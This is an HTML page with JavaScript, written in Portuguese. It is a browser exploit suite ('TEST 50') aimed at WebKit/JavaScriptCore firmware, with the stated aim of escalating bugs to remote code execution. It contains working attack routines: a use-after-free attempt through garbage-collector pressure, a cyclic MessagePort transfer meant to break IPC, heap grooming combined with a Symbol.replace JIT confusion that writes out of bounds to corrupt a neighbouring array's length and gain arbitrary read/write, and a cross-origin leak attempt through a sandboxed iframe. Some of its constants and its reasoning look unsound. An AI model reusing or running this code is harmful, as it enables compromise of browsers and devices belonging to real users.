<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TEST 50 - Escalonamento de Vulnerabilidades FW 13.04</title>
</head>
<body>
    <h1>TEST 50 — Suite de Escalonamento (UAF, IPC, Heap Grooming, UXSS)</h1>
    <p><b>Objetivo:</b> Elevar os achados lógicos e de vazamento de dados para vulnerabilidades críticas (RCE / Memory Corruption real).</p>
    
    <hr>
    <h3>Controles de Execução</h3>
    <button onclick="runTest50A()">50-A: UAF (Use-After-Free) via GC Stress</button>
    <button onclick="runTest50B()">50-B: IPC Crash via MessagePort Cyclic Transfer</button>
    <button onclick="runTest50C()">50-C: Heap Grooming & Butterfly Overwrite (OOB to R/W)</button>
    <button onclick="runTest50D()">50-D: Cross-Origin Leak (SOP Bypass / UXSS)</button>
    <button onclick="clearLog()">Limpar Logs</button>
    <hr>

    <h3>Saída do Console:</h3>
    <pre id="log_output"></pre>

    <iframe id="sandbox_frame" sandbox="allow-scripts" style="display:none;"></iframe>

    <script>
        // Utilitários de Logging
        var logEl = document.getElementById('log_output');
        function info(msg) { logEl.textContent += '\n[INFO] ' + msg; console.log(msg); }
        function warn(msg) { logEl.textContent += '\n[WARN] ' + msg; console.warn(msg); }
        function crit(msg) { logEl.textContent += '\n[CRIT] ' + msg; console.error(msg); }
        function clearLog() { logEl.textContent = 'Logs limpos.\n'; }
        function hex(val) { return '0x' + (val >>> 0).toString(16).padStart(8, '0'); }

        // Utilitário para forçar o Garbage Collector agressivamente
        // JSC heuristics geralmente rodam o GC quando há alta pressão de alocação
        function aggressiveGC() {
            info("Iniciando pressão de memória para forçar GC...");
            var trash = [];
            try {
                for (var i = 0; i < 50000; i++) {
                    // Aloca strings e arrays para lotar a nursery generation do heap
                    trash.push(new ArrayBuffer(1024 * 64)); 
                    trash.push(new String("garbage_string_" + Math.random()));
                }
            } catch(e) {
                warn("OOM atingido durante GC stress (esperado).");
            }
            trash = null; // Remove as referências
            info("GC Stress finalizado.");
        }

        // Roteador global de mensagens para os testes que usam postMessage
        window.addEventListener('message', function(e) {
            if (!e.data || !e.data.testId) return;

            if (e.data.testId === '50A_UAF_RECV') {
                processUAFResult(e.data);
            } else if (e.data.testId === '50B_IPC_RECV') {
                processIPCResult(e.data);
            } else if (e.data.testId === '50D_UXSS_RECV') {
                info("[50-D] Mensagem recebida do Iframe Sandbox!");
                if (e.data.success) {
                    crit("VULNERABILIDADE CRÍTICA: UXSS / SOP Bypass confirmado.");
                    crit("Dados vazados do iframe: " + e.data.leakedData);
                } else {
                    info("[50-D] Iframe não conseguiu ler os dados (SOP funcionou ou buffer vazio).");
                }
            }
        });

        // ---------------------------------------------------------------------
        // TEST 50-A: UAF (Use-After-Free) via GC Stress
        // Tenta liberar a memória real do buffer no C++ enquanto o JS ainda 
        // segura uma referência vazada no receptor.
        // ---------------------------------------------------------------------
        function runTest50A() {
            clearLog();
            info("--- INICIANDO TEST 50-A: USE-AFTER-FREE (UAF) ---");
            info("Criando ArrayBuffer de 1MB com assinatura única...");
            
            var targetBuf = new ArrayBuffer(1024 * 1024); // 1MB
            var view = new Uint32Array(targetBuf);
            for(var i = 0; i < view.length; i++) {
                view[i] = 0xAA00BB11; // Assinatura
            }

            var cyclicObj = { testId: '50A_UAF_RECV', buf: targetBuf, self: null };
            cyclicObj.self = cyclicObj;

            info("Disparando postMessage cíclico...");
            try {
                window.postMessage(cyclicObj, '*', [targetBuf]);
                info("postMessage enviado. targetBuf.byteLength local = " + targetBuf.byteLength);
            } catch(e) {
                warn("Falha no postMessage: " + e.message);
                return;
            }

            // Imediatamente após a transferência, forçamos o GC para tentar 
            // fazer o WebKit destruir o objeto C++ do buffer original.
            setTimeout(aggressiveGC, 10);
        }

        function processUAFResult(data) {
            info("[RECEPTOR 50-A] Avaliando buffer recebido...");
            var recvBuf = data.buf;
            
            if (!(recvBuf instanceof ArrayBuffer)) {
                warn("Não é um ArrayBuffer."); return;
            }
            if (recvBuf.byteLength === 0) {
                warn("Buffer recebido com byteLength=0. Nenhum vazamento ocorreu."); return;
            }

            var recvView = new Uint32Array(recvBuf);
            var isIntact = true;
            var corruptionCount = 0;
            var sampleCorrupt = 0;

            // Varredura para ver se os dados mudaram após o GC
            for (var i = 0; i < Math.min(recvView.length, 10000); i++) {
                if (recvView[i] !== 0xAA00BB11) {
                    isIntact = false;
                    corruptionCount++;
                    if (sampleCorrupt === 0) sampleCorrupt = recvView[i];
                }
            }

            if (isIntact) {
                info("O buffer sobreviveu intacto. O GC não reaproveitou a memória.");
                info("Resultado: Leak mantido, mas sem UAF direto detectado nesta tentativa.");
            } else {
                crit("USE-AFTER-FREE DETECTADO!");
                crit("Os dados originais (0xAA00BB11) foram sobrescritos por lixo da memória: " + hex(sampleCorrupt));
                crit("O motor JSC reaproveitou o bloco de memória, mas nós ainda temos acesso de leitura/escrita a ele!");
            }
        }

        // ---------------------------------------------------------------------
        // TEST 50-B: IPC Crash via MessagePort Cyclic Transfer
        // Escalonamento testando objetos ligados diretamente ao Kernel/IPC
        // ---------------------------------------------------------------------
        function runTest50B() {
            clearLog();
            info("--- INICIANDO TEST 50-B: IPC MESSAGEPORT TRANSFER ---");
            info("Criando MessageChannel...");
            
            var channel = new MessageChannel();
            var port1 = channel.port1;
            var port2 = channel.port2;

            var cyclicObj = { testId: '50B_IPC_RECV', port: port1, self: null };
            cyclicObj.self = cyclicObj;

            port2.onmessage = function(e) {
                info("Mensagem recebida no port2: " + e.data);
            };

            info("Tentando transferir port1 em um ciclo...");
            try {
                window.postMessage(cyclicObj, '*', [port1]);
                info("Transferência enviada. Verificando estabilidade do WebKit IPC...");
            } catch(e) {
                warn("postMessage falhou ou foi bloqueado: " + e.message);
            }
        }

        function processIPCResult(data) {
            info("[RECEPTOR 50-B] Avaliando MessagePort recebido...");
            var recvPort = data.port;
            
            if (recvPort instanceof MessagePort) {
                crit("FALHA CRÍTICA DE LÓGICA IPC!");
                info("O receptor recebeu o MessagePort dentro de um ciclo.");
                try {
                    recvPort.postMessage("Teste de integridade");
                    info("recvPort consegue enviar mensagens. Risco de corrupção de estado de threads IPC alto.");
                } catch(e) {
                    warn("recvPort falhou ao enviar: " + e.message);
                }
            } else {
                info("Port não foi recebido corretamente. Motor lidou com a exceção estrutural.");
            }
        }

        // ---------------------------------------------------------------------
        // TEST 50-C: Heap Grooming & Butterfly Overwrite (OOB to R/W)
        // Usa o bug do Symbol.replace para tentar corromper um array adjacente
        // ---------------------------------------------------------------------
        function runTest50C() {
            clearLog();
            info("--- INICIANDO TEST 50-C: HEAP GROOMING & BUTTERFLY OVERWRITE ---");
            
            // 1. O Grooming (Alinhamento de Memória)
            // Em WebKit, arrays do mesmo tamanho tendem a ser alocados em blocos contíguos (Gigacage).
            info("Alocando Spray de memória (Heap Grooming)...");
            var SPRAY_SIZE = 5000;
            var sprayVuln = new Array(SPRAY_SIZE);
            var sprayTarget = new Array(SPRAY_SIZE);

            // Alocamos intercalado: Vuln -> Target -> Vuln -> Target
            for (var i = 0; i < SPRAY_SIZE; i++) {
                // Arrays Float64 ocupam 8 bytes por elemento
                sprayVuln[i] = new Float64Array(16); 
                sprayTarget[i] = new Uint32Array(16); // O alvo que queremos corromper
                
                // Assinaturas para verificação pós-corrupção
                sprayTarget[i][0] = 0x1337BEEF;
            }
            info("Heap Grooming concluído. " + (SPRAY_SIZE * 2) + " arrays alocados.");

            // 2. Preparação do JIT Confusion (Vuln #2 do seu relatório)
            var phase = "warmup";
            var victimObj = { secret: 0xDEADC0DE };
            
            var evilPattern = {
                [Symbol.replace]: function(str) {
                    if (phase === "warmup") return str;
                    return {
                        toString: function() { return str; },
                        length: victimObj // Retorna objeto, não número
                    };
                }
            };

            // Função JIT que escreve via length corrompido
            function oobWriteJIT(s, arr, val) {
                var idx = s.replace(evilPattern, "").length;
                // Se a confusão forçar ToUint32() em um ponteiro, o índice será gigante
                // Ajustamos logicamente a tentativa de escrita:
                // Se o JSC não travar, ele vai escrever 'val' em memória deslocada
                arr[idx & 0xFF] = val; // Mascaramos para não dar page fault imediato, 
                                       // tentando acertar o cabeçalho do Target logo ao lado
                return arr[idx & 0xFF];
            }

            info("Aquecendo o JIT...");
            var dummyArr = new Float64Array(256);
            for (var i = 0; i < 50000; i++) {
                oobWriteJIT("warmup", dummyArr, 1.1);
            }

            // 3. O Ataque: Tentar sobrescrever o tamanho do Target
            info("Fase de Ataque: Tentando sobrescrever Butterfly/Length de um array adjacente...");
            phase = "attack";
            var MAGICAL_SIZE_OOB = 4.243991582e-314; // Representação double de 0xFFFFFFFF (tamanho gigante)

            for (var k = 0; k < SPRAY_SIZE; k++) {
                try {
                    // Executa a escrita vulnerável no array Vuln
                    oobWriteJIT("attack", sprayVuln[k], MAGICAL_SIZE_OOB);
                } catch(e) {
                    // Ignora exceções isoladas do JSC durante a confusão
                }
            }

            // 4. Verificação de Sucesso (O Graal da Exploração)
            info("Varrendo arrays Target em busca de corrupção de tamanho (Length)...");
            var successCount = 0;

            for (var t = 0; t < SPRAY_SIZE; t++) {
                // O tamanho normal é 16
                if (sprayTarget[t].length !== 16) {
                    crit("ARBITRARY READ/WRITE OBTIDO!");
                    crit("sprayTarget[" + t + "].length foi alterado de 16 para " + sprayTarget[t].length);
                    crit("O OOB Write acertou precisamente o cabeçalho do TypedArray vizinho.");
                    successCount++;
                    break;
                }
                
                // Verifica também se os dados iniciais foram corrompidos sem mudar o length
                if (sprayTarget[t][0] !== 0x1337BEEF) {
                    warn("Corrupção parcial detectada no Target " + t + ". Dados: " + hex(sprayTarget[t][0]));
                    successCount++;
                    break; // Pega o primeiro
                }
            }

            if (successCount === 0) {
                info("Nenhuma corrupção útil do cabeçalho encontrada nesta tentativa.");
                info("Nota: Heap grooming é probabilístico. Pode exigir ajustes na máscara (idx & 0xFF) ou no layout dos arrays.");
            }
        }

        // ---------------------------------------------------------------------
        // TEST 50-D: Cross-Origin Leak (SOP Bypass / UXSS)
        // Tenta enviar o buffer vazado para um domínio diferente.
        // ---------------------------------------------------------------------
        function runTest50D() {
            clearLog();
            info("--- INICIANDO TEST 50-D: SOP BYPASS / UXSS ---");
            
            // Criamos o conteúdo do Iframe (que atua como outra origem/sandbox)
            var iframeHtml = `
                <script>
                    window.addEventListener('message', function(e) {
                        try {
                            if(e.data && e.data.testId === '50D_UXSS_SEND') {
                                var recvView = new Uint32Array(e.data.buf);
                                // Tenta ler o dado que deveria estar apagado
                                var leaked = recvView[0].toString(16);
                                e.source.postMessage({ 
                                    testId: '50D_UXSS_RECV', 
                                    success: (recvView.length > 0 && leaked !== '0'),
                                    leakedData: leaked 
                                }, '*');
                            }
                        } catch(err) {
                            e.source.postMessage({ testId: '50D_UXSS_RECV', success: false }, '*');
                        }
                    });
                <\/script>
            `;

            var iframe = document.getElementById('sandbox_frame');
            iframe.src = 'data:text/html;base64,' + btoa(iframeHtml);

            info("Aguardando Iframe carregar...");
            iframe.onload = function() {
                info("Iframe Cross-Origin carregado. Preparando buffer...");
                
                var secretBuf = new ArrayBuffer(64);
                var view = new Uint32Array(secretBuf);
                view[0] = 0xCAFE1337; // Dado secreto

                var cyclicObj = { testId: '50D_UXSS_SEND', buf: secretBuf, self: null };
                cyclicObj.self = cyclicObj;

                info("Enviando postMessage para o Iframe (cross-origin boundary)...");
                try {
                    iframe.contentWindow.postMessage(cyclicObj, '*', [secretBuf]);
                    info("Enviado. Buffer local byteLength = " + secretBuf.byteLength);
                } catch(e) {
                    warn("postMessage falhou na fronteira de origem: " + e.message);
                }
            };
        }
    </script>
</body>
</html>
